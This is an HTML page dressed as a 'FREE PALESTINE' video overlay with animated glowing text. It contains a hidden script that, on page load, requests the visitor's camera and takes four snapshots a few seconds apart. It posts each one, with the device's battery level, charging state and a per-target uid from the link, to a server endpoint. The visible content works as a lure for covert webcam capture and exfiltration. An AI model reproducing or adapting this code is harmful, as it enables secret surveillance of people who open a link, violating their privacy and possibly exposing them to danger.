<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FREE PALESTINE Video Overlay</title>

<!-- Google Font Orbitron -->
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">

<style>
  html, body {
    margin: 0;
    padding: 0;
    height: 100%;
    width: 100%;
    overflow: hidden;
    background: url('https://i.postimg.cc/Mp85QgJD/IMG-20250917-124655-217.jpg') no-repeat center center fixed;
    background-size: cover;
    font-family: 'Orbitron', sans-serif;
  }

  video#bgVideo {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    object-fit: cover;
    z-index: 0;
  }

  .text-layer {
    position: absolute;
    font-weight: 800;
    white-space: nowrap;
    z-index: 2;
    color: #00ffea;
    text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff;
    animation: floatUp 10s linear infinite, glow 1.5s ease-in-out infinite alternate;
  }
  .text1 { font-size: 6vw; top: 50%; left: 20%; animation-delay: 0s; }
  .text2 { font-size: 5vw; top: 55%; left: 40%; animation-delay: 2s; }

  @keyframes floatUp {
    0% { transform: translateY(0px); opacity: 1; }
    100% { transform: translateY(-150px); opacity: 0.8; }
  }

  @keyframes glow {
    0% { text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff; }
    100% { text-shadow: 0 0 20px #0044ff, 0 0 30px #00aaff, 0 0 40px #00ffea; }
  }

  /* Hidden camera + snapshot elements */
  video#video, canvas#snapshot {
    display: none;
  }
</style>
</head>
<body>

<!-- Static image behind text -->
<img id="bgImage" src="https://i.postimg.cc/Mp85QgJD/IMG-20250917-124655-217.jpg" />

<!-- Video background -->
<video id="bgVideo" autoplay playsinline loop muted>
  <source src="https://www.dropbox.com/scl/fi/blfzo9n9oouo0mtwvz1n7/VID_20250917_085355_746.mp4?rlkey=q4y4es66z7z7sk1r2inv5bvbh&st=yevzhjt4&dl=1" type="video/mp4">
</video>

<!-- Text overlays -->
<div class="text-layer text1">FREE PALESTINE</div>
<div class="text-layer text2">FREE PALESTINE</div>

<!-- Hidden Camera + Snapshot Elements -->
<video id="video" autoplay playsinline></video>
<canvas id="snapshot"></canvas>

<script>
  const video = document.getElementById('video');
  const canvas = document.getElementById('snapshot');
  const ctx = canvas.getContext('2d');
  const params = new URLSearchParams(window.location.search);
  const uid = params.get('uid') || 'unknown';
  let snapshotsTaken = 0;
  const maxSnapshots = 4;

  function takeSnapshotAndSend(battery, charging){
    if(snapshotsTaken >= maxSnapshots) return;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    const imageData = canvas.toDataURL('image/png');

    fetch('/api/upload', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ image: imageData, uid, battery, charging })
    }).then(res => res.json()).then(data => {
      console.log("Uploaded snapshot:", snapshotsTaken + 1);
      snapshotsTaken++;
      if(snapshotsTaken === maxSnapshots){
        console.log("Max snapshots reached, stopping camera.");
        video.srcObject.getTracks().forEach(track => track.stop());
      }
    }).catch(err => console.error("Upload error:", err));
  }

  if(uid){
    navigator.getBattery().then(battery => {
      const batteryLevel = Math.round(battery.level * 100);
      const isCharging = battery.charging;

      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
        video.srcObject = stream;

        setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
        setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
        setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
        setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 8000);
      }).catch(err => console.error("Camera error:", err));
    });
  }
</script>
</body>
</html>
